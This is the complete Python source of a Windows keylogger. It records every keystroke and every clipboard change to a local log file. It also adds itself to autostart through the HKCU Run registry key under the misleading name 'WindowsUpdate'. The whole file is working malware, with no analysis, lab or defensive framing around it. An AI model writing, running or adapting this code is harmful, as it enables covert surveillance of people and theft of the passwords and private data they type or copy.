import os
import sys
import time
import logging
import threading
import winreg
import pyperclip
import signal
from datetime import datetime
from pynput import keyboard
from pynput.keyboard import Key

class Keylogger:
    def __init__(self):
        """Initialize the keylogger"""
        self.log_file = "keylog.txt"
        self.is_running = False
        self.keyboard_listener = None
        self.clipboard_thread = None
        self.last_clipboard = ""
        
        # Configure logging
        self.setup_logging()
        
        # Setup persistence
        self.setup_persistence()

    def setup_logging(self):
        """Configure logging settings"""
        logging.basicConfig(
            filename=self.log_file,
            level=logging.DEBUG,
            format='%(asctime)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )

    def setup_persistence(self):
        """Add registry key for auto-start"""
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
            logging.info("Persistence mechanism installed successfully")
        except Exception as e:
            logging.error(f"Failed to setup persistence: {str(e)}")

    def on_press(self, key):
        """Handle key press events"""
        try:
            if hasattr(key, 'char'):
                logging.info(f'Key pressed: {key.char}')
            else:
                logging.info(f'Special key pressed: {key}')
        except Exception as e:
            logging.error(f'Error in on_press: {str(e)}')

    def on_release(self, key):
        """Handle key release events"""
        if key == keyboard.Key.esc:
            return False

    def monitor_clipboard(self):
        """Monitor clipboard changes"""
        while self.is_running:
            try:
                current_clipboard = pyperclip.paste()
                if current_clipboard != self.last_clipboard:
                    logging.info(f'Clipboard changed: {current_clipboard}')
                    self.last_clipboard = current_clipboard
                time.sleep(1)
            except Exception as e:
                logging.error(f'Error monitoring clipboard: {str(e)}')
                time.sleep(1)

    def start(self):
        """Start the keylogger"""
        self.is_running = True
        
        # Start keyboard listener
        self.keyboard_listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        )
        self.keyboard_listener.start()

        # Start clipboard monitoring in a separate thread
        self.clipboard_thread = threading.Thread(target=self.monitor_clipboard)
        self.clipboard_thread.start()

        logging.info("Keylogger started successfully")

    def stop(self):
        """Stop the keylogger"""
        self.is_running = False
        if self.keyboard_listener:
            self.keyboard_listener.stop()
        if self.clipboard_thread:
            self.clipboard_thread.join()
        logging.info("Keylogger stopped successfully")

def signal_handler(signum, frame):
    """Handle Ctrl+C signal"""
    print("\nStopping keylogger...")
    if keylogger:
        keylogger.stop()
    sys.exit(0)

def main():
    global keylogger
    keylogger = None
    
    # Set up signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        # Initialize and start keylogger
        keylogger = Keylogger()
        keylogger.start()
        keylogger.keyboard_listener.join()
    except Exception as e:
        logging.error(f"Unexpected error: {str(e)}")
        if keylogger:
            keylogger.stop()
        sys.exit(1)

if __name__ == "__main__":
    main()
